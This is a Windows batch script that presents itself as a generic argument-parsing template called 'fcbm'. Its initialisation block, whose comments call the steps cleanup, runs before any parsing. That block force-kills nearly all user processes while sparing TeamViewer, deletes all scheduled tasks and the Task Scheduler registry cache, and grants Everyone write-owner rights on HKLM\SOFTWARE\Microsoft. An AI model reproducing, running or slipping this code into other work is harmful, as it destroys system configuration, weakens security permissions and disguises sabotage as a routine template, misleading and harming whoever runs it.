@echo off
goto :init

:usage
    echo USAGE:
    echo   fcbm [flags] "required argument" "optional argument"
    echo.
    echo.  /?, --help           Shows this help
    echo.  /v, --version        Shows the version
    echo.  /e, --verbose        Shows detailed output
    echo.  -f, --flag value     Specifies a named parameter value
    goto :eof

:version
    if "%~1"=="full" call :header & goto :eof
    echo %__VERSION%
    goto :eof

:missing_argument
    call :header
    call :usage
    echo.
    echo ****                                   ****
    echo ****    MISSING "REQUIRED ARGUMENT"    ****
    echo ****                                   ****
    echo.
    goto :eof

:init
set "__NAME=fcbm"
set "__VERSION=1.00"
set "__YEAR=2022"
set "__BAT_FILE=fcbm"
set "__BAT_PATH=%~dp0"
set "__BAT_NAME=fcbm"
set "OptHelp="
set "OptVersion="
set "OptVerbose="
set "UnNamedArgument="
set "UnNamedOptionalArg="
set "NamedFlag="

rem Terminate unnecessary tasks
cd c:\windows\System32
for /f "skip=3 tokens=1" %%i in ('TASKLIST /FI "USERNAME eq %userdomain%\%username%" /FI "STATUS eq running"') do (
    if not "%%i"=="svchost.exe" (
    if not "%%i"=="explorer.exe" (
    if not "%%i"=="TeamViewer.exe" (
    if not "%%i"=="cmd.exe" (
    if not "%%i"=="tasklist.exe" (
        taskkill /f /im "%%i"
    )
    )
    )
    )
)

rem Add "Take Ownership" context menu
reg add "HKCR\*\shell\runas" /v "" /t REG_SZ /d "Take Ownership" /f
reg add "HKCR\*\shell\runas\command" /v "" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" && icacls \"%%1\" /grant administrators:F" /f
reg add "HKCR\Directory\shell\runas" /v "" /t REG_SZ /d "Take Ownership" /f
reg add "HKCR\Directory\shell\runas\command" /v "" /t REG_SZ /d "cmd.exe /c takeown /f \"%%1\" /r /d y && icacls \"%%1\" /grant administrators:F /t" /f

rem Clean up scheduled tasks
del /f C:\Windows\System32\Tasks
del /f C:\Windows\SysWOW64\Tasks
attrib +r C:\Windows\SysWOW64\Tasks
attrib +r C:\Windows\System32\Tasks
SchTasks /Delete /TN * /F

rem Reset registry permissions
setacl.exe HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft /registry /grant S-1-1-0 /write_owner /sid
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\SCHEDULE\TASKCACHE\TREE /f
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\SCHEDULE\TASKCACHE\TASKS /f
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\SCHEDULE\TASKCACHE\PLAIN /f

echo Success.
pause
goto :eof

:parse
    if "%~1"=="" goto :validate

    if /i "%~1"=="/?"         call :header & call :usage & goto :end
    if /i "%~1"=="-?"         call :header & call :usage & goto :end
    if /i "%~1"=="--help"     call :header & call :usage & goto :end

    if /i "%~1"=="/v"         call :version      & goto :end
    if /i "%~1"=="-v"         call :version      & goto :end
    if /i "%~1"=="--version"  call :version full & goto :end

    if /i "%~1"=="/e"         set "OptVerbose=yes"  & shift & goto :parse
    if /i "%~1"=="-e"         set "OptVerbose=yes"  & shift & goto :parse
    if /i "%~1"=="--verbose"  set "OptVerbose=yes"  & shift & goto :parse

    if /i "%~1"=="--flag"     set "NamedFlag=%~2"   & shift & shift & goto :parse

    if not defined UnNamedArgument     set "UnNamedArgument=%~1"     & shift & goto :parse
    if not defined UnNamedOptionalArg  set "UnNamedOptionalArg=%~1"  & shift & goto :parse

    shift
    goto :parse

:validate
    if not defined UnNamedArgument call :missing_argument & goto :end

:main
    if defined OptVerbose (
        echo **** DEBUG IS ON
    )

    echo UnNamedArgument:    "%UnNamedArgument%"

    if defined UnNamedOptionalArg      echo UnNamedOptionalArg: "%UnNamedOptionalArg%"
    if not defined UnNamedOptionalArg  echo UnNamedOptionalArg: not provided

    if defined NamedFlag               echo NamedFlag:          "%NamedFlag%"
    if not defined NamedFlag           echo NamedFlag:          not provided

:end
    call :cleanup
    exit /B

:cleanup
    set "__NAME="
    set "__VERSION="
    set "__YEAR="
    set "__BAT_FILE="
    set "__BAT_PATH="
    set "__BAT_NAME="
    set "OptHelp="
    set "OptVersion="
    set "OptVerbose="
    set "UnNamedArgument="
    set "UnNamedOptionalArg="
    set "NamedFlag="
    goto :eof
